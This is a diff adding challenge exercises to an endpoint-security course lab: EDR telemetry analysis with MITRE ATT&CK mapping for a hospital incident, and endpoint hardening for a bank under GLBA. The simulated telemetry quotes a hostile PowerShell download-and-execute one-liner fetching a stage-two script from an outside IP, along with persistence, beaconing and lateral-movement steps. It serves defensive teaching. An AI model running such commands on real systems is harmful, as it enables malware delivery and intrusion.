@@ -177,4 +177,61 @@ Before submitting, verify:
 
 ---
 
+## Part 9 — Challenge Exercise
+
+### Challenge 1: EDR Telemetry Deep Dive and MITRE ATT&CK Mapping
+
+A healthcare organization's EDR platform has flagged a suspicious sequence of events on a clinical workstation. The workstation belongs to a nurse in the oncology ward and is used to access the EHR system. The following telemetry was captured over a 45-minute period.
+
+```text
+[07:22:14] Process: chrome.exe visited http://update-adobeflash.net/install.php
+[07:22:31] File: chrome.exe wrote C:\Users\nurse01\Downloads\AdobeUpdate.exe
+[07:22:45] Process: AdobeUpdate.exe executed
+[07:22:46] Process: AdobeUpdate.exe spawned cmd.exe
+[07:22:47] Process: cmd.exe executed: powershell -w hidden -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.12/stage2.ps1')"
+[07:23:01] Network: powershell.exe connected to 185.220.101.12:80 (outbound)
+[07:23:04] File: powershell.exe wrote C:\Windows\Temp\winupd.exe
+[07:23:05] Process: winupd.exe executed
+[07:23:41] Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run added value: winupd.exe
+[07:24:00] Network: winupd.exe connected to 91.199.212.44:443 (outbound, repeating every 120 seconds)
+[07:48:32] Process: winupd.exe executed: whoami, ipconfig /all, net user, net localgroup administrators
+[07:49:15] Process: winupd.exe executed: net use \\10.0.5.22\C$ /user:DOMAIN\admin <password>
+[07:49:18] Network: winupd.exe initiated SMB connection to 10.0.5.22 (EHR application server)
+```
+
+1. Reconstruct the complete attack chain in plain English as an executive summary (five to eight sentences). Identify the likely initial access vector, the delivery mechanism, and the attacker's apparent objective based on the final events in the telemetry.
+
+2. Map each event group to the corresponding MITRE ATT&CK tactic and a specific technique name (technique IDs are not required). Present your mapping in a table with columns for Time Range, MITRE Tactic, Technique Name, and Evidence from Telemetry.
+
+3. HIPAA Security Rule § 164.312(b) requires audit controls that record and examine activity in systems containing electronic protected health information (ePHI). The attacker reached the EHR application server at 07:49:18. Identify three specific pieces of information the EDR telemetry provides that a traditional Windows event log would NOT have captured, and explain why each is valuable for the HIPAA-required audit and breach notification analysis.
+
+4. The organization's security team wants to implement three endpoint controls that would have broken this attack chain at the earliest possible point. For each control, identify: the specific telemetry event it would have prevented, the control name and mechanism, and whether it is a preventive or detective control.
+
+### Challenge 2: Endpoint Hardening Program Design
+
+A regional bank with 450 employees is conducting its annual security program review. An external assessment identified the following endpoint security gaps across their Windows 10 fleet of 300 workstations and 80 servers.
+
+- No centralized patch management — individual workstations self-update; servers are patched manually on an ad-hoc basis.
+- CIS Benchmark compliance has never been assessed; there is no baseline configuration standard.
+- Antivirus signatures are updated weekly via scheduled task; no behavioral detection or EDR is deployed.
+- Full disk encryption is not deployed on workstations; laptops are issued to 60 remote employees.
+- Mobile devices access corporate email via ActiveSync with no MDM or MAM enrollment required.
+- Application allowlisting is not in place; employees can install and run any software.
+
+1. The bank must comply with GLBA (Gramm-Leach-Bliley Act) Safeguards Rule, which requires a written information security program including risk assessment and safeguards. For each of the six gaps listed, identify: the specific GLBA Safeguards Rule section that applies, the risk the gap creates to customer financial data, and the specific technical control that remediates it.
+
+2. The bank's IT team of four must implement all six controls within a 12-month budget cycle. Prioritize the six remediations into three tiers (immediate — 0 to 90 days, near-term — 90 to 180 days, long-term — 180 to 365 days). For each tier, justify the placement of each control using risk impact and implementation complexity.
+
+3. For the 60 remote employees with laptops, design a complete endpoint security standard. Your standard must address: full disk encryption configuration (BitLocker with TPM + PIN or TPM-only — justify which), VPN requirements, EDR agent deployment, patch enforcement for off-network devices, and the MDM or MAM model for their corporate smartphones. For each requirement, specify the technical implementation.
+
+4. After implementing EDR across all 300 workstations, the bank's security team estimates they will receive 150 to 200 EDR alerts per day. With two analysts working eight-hour shifts, describe a triage and escalation workflow that allows the team to process all alerts without alert fatigue. Your workflow must include: alert severity tiering criteria, automated response actions for high-confidence detections, escalation criteria for analyst review, and a metric the team should track weekly to measure the program's effectiveness.
+
+### Reflection Questions
+
+1. After completing both challenges, explain why the combination of application allowlisting and EDR provides stronger protection than either control alone. Specifically, describe the attack category that allowlisting prevents that EDR would only detect after execution, the attack category that EDR detects that allowlisting cannot prevent (because the malicious activity uses trusted, allowlisted binaries), and why the defense-in-depth principle requires both controls rather than choosing the "better" one.
+
+2. In Challenge 2, you designed a patch management program for a bank with a small IT team. A security manager argues that deploying EDR should be prioritized over patching because EDR can detect exploitation of unpatched vulnerabilities. Identify two specific attack scenarios where EDR would fail to prevent a breach even if deployed, and use these scenarios to explain why patch management remains a foundational control that behavioral detection cannot replace.
+
+---
+
 Module 08 Lab — End
